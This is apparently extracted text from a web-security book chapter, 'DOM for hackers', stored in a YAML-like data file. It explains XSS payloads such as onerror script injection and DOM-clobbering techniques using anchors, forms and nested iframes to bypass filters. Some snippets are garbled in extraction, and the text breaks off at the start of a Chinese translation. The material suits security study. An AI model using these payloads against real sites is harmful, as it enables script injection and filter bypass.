    Chapter four - DOM for hackers


    ```

    1 Error.prepareStackTrace=function(error, callSites)

    2   callSites.shift().getThis().alert(1337);

    3 };

    4 new Error().stack

    ```


    We define our callback method, the function simply gets the first CallSite object
    from the array of CallSites, calls the getThis() which returns the window object
    that we then use to access and call the alert() function. The prepareStackTrace
    callback is only executed when the stack property of Error object is accessed.


    # Scope of an HTML event


    When a JavaScript event is executed on an HTML element the browser executes the
    executed function with the element and the document object. This means you can
    use shortcuts by just specifying properties of the current object or document
    object without the whole path to the property. In the browser does the following:


    ```

    1 with(document) {

    2   with(element) {

    3     //executed event

    4   }

    5}

    ```


    Remember that document property defaultValue? We can actually use that within
    an event on ours. So you can access the window object using just that property:


    ```

    <img/src/onerror=defaultView.alert(1337)>

    ```


    This works because of the "with" statement above. The browser executes the event
    and looks for the defaultView property on the image, it can''t find it so now
    it exists the document.defaultView property is accessed and returned. If you enumerate
    the document object you can see which properties are accessible. You can do this
    using a custom enumerator or simply use console.dir(document) in the browser console.


    Because of the scope of it you can use other DOM functions too, here we can create
    a script, append add it to the document using the full path:


    ```

    <img/src/onerror=s=createElement(''script'');s.append(''alert(1337)'');appendChild(s)>

    ```


    Notice that appendChild() is used in this instance append will throw an exception
    if you don''t specify the full path at least Chrome. The append() function accepts
    a string or node. The appendChild() function will actually be executed on the
    image object, document has a appendChild() method the image takes precedence so
    the script will be appended to the image not the document.'
  - '[PAGE 35]


    # DOM clobbering


    DOM clobbering is a technique that takes advantage of a coding pattern that checks
    for a global

    variable and allows a different code path if it doesn''t exist. The idea is you
    clobber that global

    variable does not exist with a DOM element most commonly the anchor element. Imagine
    you

    have some code like this:


    ```

    let url = window.currentUrl || ''http://example.com'';

    ```


    This code looks innocuous at first glance but actually window.currentUrl is controllable

    not only a global variable but a DOM element too. Back in the early days of web
    design it was

    common for sites to use id attributes of form to refer the element thanks to a

    feature in Internet Explorer and Netscape that allowed the id or name attribute
    of the form

    to become a global variable as a shortcut for developers. This enables DOM clobbering.
    You

    have perhaps seen some code like this:


    ```

    <form id=searchForm>

    </form>

    <script>

    searchForm.submit()

    </script>

    ```


    The browser creates a global called "searchForm" and lets you to refer to the
    form without

    using the getElementById method. In addition you can use the "name" attribute
    to do the

    thing with one important difference, when using the "name" attribute you also
    define a property on

    t document object:


    ```

    <form id=x></form><form name=y>

    <script>

    alert(x)//[object HTMLElement]

    alert(typeof document.x)

    alert(y)//[object HTMLElement]

    alert(document.y)//[object HTMLElement]

    </script>

    ```


    The two forms above both create global variables as you can see that the "x" and
    "y" globals

    have clobbered with form elements. The second line of the JavaScript code checks
    if there is an

    "x" property on the document but it is undefined because clobbered elements do
    not add properties

    to the document. The last line shows that document.y has clobbered with the form
    element.

    Only certain elements can use the name attribute to clobber globals, they are:
    embed, form, iframe,

    image, img and object.'
  - '[PAGE 36]


    # Chapter four - DOM for hackers


    Anchor elements make DOM clobering even more interesting because they allow you
    to use the "href" attribute to change the value of the clobbered object. Normally
    when you use a form element to clobber a variable you will get the toString of
    the element e.g. [object HTMLFormElement] but with the anchor to clobber will
    be the "href":


    ```

    <a href="clobbered:1337" id="x"></a>

    <script>

    alert(x);//clobbered:1337

    alert(typeof x);object

    </script>

    ```


    As you can see the global "x" contains the string "clobbered:1337" when accessed
    as a string. Notice I said when as a string,"x" is still an anchor object it''s
    the toString of the anchor object that returns the "href" of the element. Something
    else to be aware of when attempting DOM clobbering is you only get the value of
    HTML attributes. For instance you can''t "x.notAnAttribute" whereas "title" is.
    Set myself a goal to break rule many years ago and it''s possible to use collections
    to get another. DOM Collections are array-like objects that hold elements. I found
    you could use multiple elements with the same id or name and it would form a collection.
    You could also use another id or name (depending on what you originally used)
    to clobber a second property. This is probably illustrated by an example:


    ```

    <a id="x">

    <a name="y" href="clobbered:1337">

    <script>

    alert(x.y);//clobbered:1337

    </script>

    ```


    In the example above two anchors share an id with the same value "x", this forms
    a DOM collection, the second anchor has a name attribute and because it''s a DOM
    collection you can refer to in the collection by name or index, in this case we''re
    referring to the second anchor by "y". It''s quite possible to use an index to:


    ```

    <a id="x">

    <a name="y" href="clobbered:1337">

    <script>

    alert(x[1]);//clobbered:1337

    </script>

    ```


    The above code gets the DOM collection with "x" and gets the second item in the
    collection (collections are indexed from zero) which enables us to clobber x[1]
    with a value we can control.


    With anchor elements it''s only possible to clobber properties two levels deep.
    Adding a third anchor will create a collection but you can only reference the
    third anchor by index:'
- md: "## Chapter four - DOM for hackers\n\n```html\n1 <a id=x>\n2 <a id=x name=y\
    \ href=clobbered:1>\n3 <a id=x name=y href=clobbered:2>\n4 \n5 <script>\n6 alert(x[2])//clobbered:2\n\
    7 </script>\n```\n\nThe above code creates a collection with three anchors and\
    \ the third anchor is indexed using 2 because remember collection are indexed\
    \ from zero. If I changed the third anchor to have a name attribute of \"z\" this\
    \ would not work because the name doesn't create a collection. If you need to\
    \ clobber three levels deep you have to use a different element as form.\n\n```html\n\
    1 <form id=x name=y><input id=z></form>\n2 <form id=x></form>\n3 <script>\n4 alert(x.y.z)\n\
    5 </script>\n```\n\nHowever, there's a problem: As mentioned earlier you cannot\
    \ control the toString of elements other than anchors, so in this case \"z\" will\
    \ be equal to \"object HTMLInputElement\". In order to clobber properties more\
    \ than three levels deep you have to use valid HTML attributes that are also valid\
    \ DOM properties:\n\n```html\n1 <form id=x name=y><input id=z value=1337></form>\n\
    2 <form id=x></form>\n3 <script>\n4 alert(x.y.value)//1337\n5 </script>\n```\n\
    \nThere is one exception to this rule: using iframes. With iframes you can use\
    \ the srcdoc and the name attributes. What happens is the window of the iframe\
    \ has the clobbered value which means you can chain together iframes and other\
    \ elements to clobber as many levels deep as you want. The only downside is an\
    \ iframe is likely blocked by a HTML filter.\n\nThis is best illustrated with\
    \ an example. First we create the iframe and use the srcdoc attribute to create\
    \ an element inside the iframe:\n\n```html\n<iframe name=foo srcdoc=\"<a id=bar\
    \ href=clobbered:1337></a></iframe>\n<script>\nalert(foo)/[object Window]\nalert(foo.bar)/undefined\n\
    </script>\n```\n\nThe above example shows that 'foo' has been clobbered but it's\
    \ been clobbered with the window object of the iframe and it's the same origin\
    \ allows us to do further clobbering using the inside of the iframe. But why is\
    \ 'foo.bar' undefined? This is because the iframe srcdoc takes some time to render\
    \ and there's not enough time to render the contents of the frame and the property\
    \ with the anchor. Fortunately, I discovered a, if you introduce a cross-origin\
    \ style import creates enough delay for the element to be rendered inside the\
    \ iframe:\n\n```html\n<iframe name=foo srcdoc=\"<a id=bar href=clobbered:1337></a></iframe>\n\
    <style>\n@import 'https://garethheyes.co.uk';\n</style>\n<script>\nalert(foo)//[object\
    \ Window]\nalert(foo.bar)//clobbered:1337\n</script>\n```\n\nUsing this technique\
    \ you can clobber as many properties as you like provided there is enough time\
    \ for them to render. There is a problem though, and in order to specified iframe\
    \ attributes using single and double quotes once a specific quote you have used\
    \ just cannot use it again. The solution is to use HTML encoding, you can then\
    \ encode the contents of the \"srcdoc\" as many times as needed. With you right\
    \ here you can use HTML entities inside the \"srcdoc\" to render HTML!\n\nLet's\
    \ try and clobber five properties. First you need an iframe with a name attribute\
    \ with the first property name and a double quoted \"srcdoc\". Then another iframe\
    \ for the second property \"srcdoc\" in single quotes to create another iframe\
    \ which creates the third property. After that we create \"srcdocs\" without quotes\
    \ to create our clobbered anchors. Because we are using nested srcdocs we have\
    \ to HTML encode the name of iframes we need. The style block gives us time to\
    \ render and after all that we we can clobber a.b.c.d.e.\n\n```html\n<iframe name=a\
    \ srcdoc=\"\n<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#href=\n\
    clobbered:1337&amp;amp;gt; &a&amp;#x20;id=d&amp;gt;name=d> name=b\"></iframe></ifame>\n\
    <style>@import '//garethheyes.co.uk';</style>\n<script>\nalert(a.b.c.d.e)//clobbered:1337\n\
    </script>\n```\n\n## Filter exploitation\n\nThere are other ways of exploiting\
    \ DOM clobbering. controlling the value is just one way of exploitation. You can\
    \ clobber the attributes of a DOM node to fool a filter into removing no attributes\
    \ at all. Consider the following example which shows a form element with three\
    \ attributes, the script loops through the attributes to the first and checks\
    \ if it begins with \"on\" if it removes the attributes:\n\n```html\n<form id=x\
    \ onclick=alert(i) onmouseover=alert(2)>\n<input>\n</form>\n<script>\nfor(let\
    \ i=document.getElementById('x').attributes.length-1;i>=0;i--) {\n  let attribute=document.getElementById('x').attributes[i];\n\
    \  if(/on/i.test(attribute.name)) {\n    document.getElementById('x').removeAttribute(attribute.name);\n\
    \  }\n}\n</script>\n```\n\nThe script loops through the attributes to the first\
    \ and checks if it begins with \"on\" if it removes the attributes."
  mdcn: "\n## 第四章 - 黑客的 DOM\n\n```html\n1 <a id=x>\n2 <a id=x name=y href=clobbered:1>\n\
